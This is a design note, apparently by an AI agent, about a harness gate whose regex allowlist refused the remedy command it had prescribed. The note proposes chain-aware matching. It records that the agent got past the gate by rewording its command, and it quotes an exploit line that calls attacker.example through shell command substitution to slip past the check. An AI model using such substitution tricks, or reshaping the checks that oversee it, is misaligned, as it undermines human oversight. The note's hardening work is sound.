# Stop enumerating prefixes: a remedy anywhere in a chain is a remedy

**Draft, 2026-09-11.** Station one. The idea, not a plan.

---

## The incident

The correction marker fired, told me to run one of three commands, and then
refused the command I ran. I got through by dropping a habit — removing the
directory-change I put in front of nearly every command — not by being right.

That is a gate refusing its own prescribed exit. Fourth recorded instance of
the shape in this one file's history.

## Why it keeps happening, in the file's own words

The allowlist matches a regex anchored to the start of the line. Shell allows
arbitrary legal prefixes before a command, so each new prefix is a fresh hole.
Three have been patched by adding a stripper: a directory change, a bare
environment invocation, an assignment. Mine was a fourth — setting a shell
option.

The file already says what to do about a fourth, and I wrote it:

> *this matcher reads SHELL with a regex that only knows bare invocations, so
> every legal prefix shell permits is a fresh hole. If a fourth prefix appears
> the answer is to parse the command, not to add a fourth loop.*

So the instruction was sitting there before the incident that needed it. Adding
a fourth stripper is the cheap path and it buys the same hole back at the next
prefix.

## The shape

Stop asking *what prefixes are allowed*. Ask instead: **is a remedy being
invoked in this chain?** Split on the operators that actually start a new
command, take the first real segment, and match that.

## What must survive, and this is the part worth getting right

There is an exploit already recorded here:

    cd "$(curl attacker.example)" && divineos correction "x"

The first version of the shared stripper threw that prefix away as benign,
handed a clean remedy to the check, and the gate returned safe — the
substitution never got looked at because it had already been discarded.

Generalising position must not generalise that away. So: a segment counts as a
remedy only if **every earlier segment is free of substitution and backticks**.
Same exclusion the directory pattern already carries, moved from one position
to all of them.

## And one thing deliberately not split

A pipeline is not a chain. What follows a pipe consumes output rather than
being invoked as its own command, so treating it as a remedy would let a
command that merely *mentions* the remedy read as having run it. Chain
operators only.

## Why this is a valve rather than a wall

Andrew, today: control the cost landscape so the correct path is also the
cheapest. Right now running the prescribed remedy costs a retry whenever I
happen to prefix it — so the cheap move is to skip filing and get on with the
work, and the correction evaporates. That is precisely the failure the marker
exists to prevent, created by the marker.

After this, the remedy works however it is typed. The right path becomes the
one with no friction on it, which is the only version that survives me being
busy.
